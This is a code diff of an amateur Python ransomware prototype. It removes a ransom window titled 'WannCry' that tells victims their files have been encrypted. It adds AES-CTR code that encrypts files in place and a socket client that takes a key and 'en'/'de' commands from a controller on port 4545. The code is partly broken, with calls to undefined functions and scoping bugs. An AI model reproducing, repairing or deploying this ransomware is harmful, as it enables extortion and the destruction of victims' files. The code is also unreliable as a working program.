@@ -1,103 +1,107 @@
 import os
 import time
+import socket
 import tkinter
-from time import *
+from time import sleep 
 from tkinter import *
 from tkinter import scrolledtext
-
 from Crypto import Random
 from Crypto.Cipher import AES
 from Crypto.Util import Counter
 
+			
 
 def data():
     ap = []
     ex = ['png '  , 'txt' , 'mp4' , 'py' , 'jpg' ]
-    for i  , f , d in os.walk('Wallaper'):
+    for i  , f , d in os.walk('moado'):
         for z in d :
             full_path = os.path.join( i , z  )
             full_path.split('.')[-1]
-            if os.path.exists(full_path):
-                ap.append(full_path)
-        return (ap)
+            ap.append(full_path)
+        return ap
+        
 
-data = data()
+  
 def partions():
     par = []
     for i in range( 65 , 101):
         x=chr(i)
-        x.upper()
         par.append(x)
-        print (par)
-        return par
+        if os.path.exists(x):    
+            return par
+      
 
-    
-def encrypt(file):
-    key = Random.new().read(16)
+  
+def encrypt(file , key):
     counter = Counter.new(128)
     c=AES.new(key , AES.MODE_CTR , counter=counter )
-    with open(file , 'r+b')as f :
-        data =16
+    with open(file, 'r+b')as f :
+        data = os.path.getsize(file)
         block = f.read(data)
         while block:
             f.seek(-len(block) , 1)
             f.write(c.encrypt(block))
             block = f.read(data)
+        f.close()
+        return [key]
 
 
 
 
 
 
-     
 
-
-
-def decrypt(file):
-    key = Random.new().read(16)
+def decrypt(file , key ):
     counter = Counter.new(128)
     c=AES.new(key , AES.MODE_CTR , counter=counter )
     with open(file , 'r+b')as f :
-        data =16
+        data = os.path.getsize(file)
         block = f.read(data)
         while block:
             f.seek(-len(block) , 1)
             f.write(c.decrypt(block))
-            block = f.read(data) 
+            block = f.read(data)
+        f.close()
 
 
 
 
 
-root = Tk()
-root.title('WannCry')
-root.configure(background='#d63031')
-root.geometry('800x800')
-root.iconbitmap('coin.png')
-root.resizable(0, 0)
-txt = scrolledtext.ScrolledText(root , font=('Arial' , 20) , state='normal' , width=50 , height = 20)
-txt.insert(
-    INSERT ,
-        """
-        """
-                   )
-coin = PhotoImage(file='coin.png' )
-label_text = Label(root , text='OooPs , your files have been encrypted' , font=('Arial' , 30 ) , bg='#d63031')
-imglabel = Label(root , relief='flat' )
-imglabel.grid(row=1 , column=0 , pady=20)
-en = Entry(root,   width=50, relief='flat'  )
-def unlock():
-    for i in data: 
-        decrypt(i)
-    print ('wait while Decrypted files ....')
-    
-    print ('Done')
-bu = Button(root,   text='Decrypt' ,  width=20 , relief= 'groove'   , command=unlock ,)
+        
 
-pady = 10
-padx = 10
-txt.grid            (row = 1,  column= 0  , padx= padx , pady= pady)
-en.grid             (row = 2 , column = 0 , padx=padx  , pady=pady )
-label_text.grid     (row = 0 , column = 0 , padx= padx ,pady= pady)
-bu.grid             (row = 3 , column = 0 , padx= 20 ,pady= 4 )
-root.mainloop()
+
+
+key =Random.new().read(16)
+files  = data()
+
+def client():
+	port = 4545
+	ip = "127.0.0.1"
+	try:
+		s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+		s.connect((ip,port))
+		while True:
+			command = s.recv(2048)
+			command = command.decode('ascii')
+			if "key" in command:
+				padding = lambda data_key:data_key + (16 -len(data_key) % 16) * "*"
+				key = padding(command.split(" ")[1]).encode('ascii')
+				s.send(b'\n the key is saved\n')
+			if command == "en":
+				files = dir_f_list("/home/abdallah/Desktop/new")
+				for f in files:
+					encryption(key,f)
+				s.send(b'\ndone\n')
+			if command == "de":
+				files = dir_f_list("/home/abdallah/Desktop/new")
+				for f in files:
+					decryption(key,f)
+				s.send(b'done')
+	except socket.error as e:
+		print("trying to connect with server with in 60 sec")
+		time.sleep(60)
+		s.close()
+		client()
+
+client()
